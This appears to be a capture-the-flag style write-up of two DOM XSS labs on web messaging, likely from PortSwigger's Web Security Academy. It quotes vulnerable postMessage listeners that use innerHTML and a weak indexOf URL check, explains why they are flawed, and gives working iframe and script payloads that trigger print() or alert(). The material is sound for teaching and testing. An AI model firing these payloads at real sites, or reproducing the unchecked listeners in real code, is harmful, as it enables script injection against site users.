### 1. DOM XSS using web messages
**Objective**: This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.<br>
Below is the snippet code we found in application home page while trying to view using View Page source.
```html
<!-- Ads to be inserted here -->
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
      document.getElementById('ads').innerHTML = e.data;
  })
</script>
```
#### Problems Identified
1. The message event listener triggers whenever any script on any webpage sends a message to your window using postMessage(). Because the code doesn't check e.origin to verify who sent the message, an attacker can host a malicious website, open your site in an iframe (or a popup), and blast harmful data straight into your listener.
2.  The code uses .innerHTML to insert e.data directly into the webpage. innerHTML doesn't just render text; it parses and executes HTML and JavaScript.<br>
Host the below script on attacker server to have XSS.
```html
// The attacker opens your vulnerable site
const targetWindow = window.open("https://your-vulnerable-site.com");
// The attacker sends a malicious payload disguised as data
targetWindow.postMessage("<img src=x onerror=alert('Hacked!')>", "*");
```
Use the below one to solve the lab.
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads.
###  2. DOM XSS using web messages and a JavaScript URL
**Objective**: This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.<br>
Below is the snippet code we found in application home page while trying to view using View Page source.
```html
 <script>
   window.addEventListener('message', function(e) {
     var url = e.data;
     if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
       location.href = url;
     }
   }, false);
 </script>
```
* The window.addEventListener('message', ...) function listens for Cross-Origin Communication (postMessage). Anyone can send a message to this window from an external site or an embedded iframe. The code takes e.data (the incoming message) and directly assigns it to location.href.
* The if statement attempts to validate the URL, but the logic is flawed: indexOf('http:') > -1 only checks if the string contains http:. It does not ensure the string starts with it, nor does it check the actual domain name.

To solve the lab you can host the below exploit on attacker's server.
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
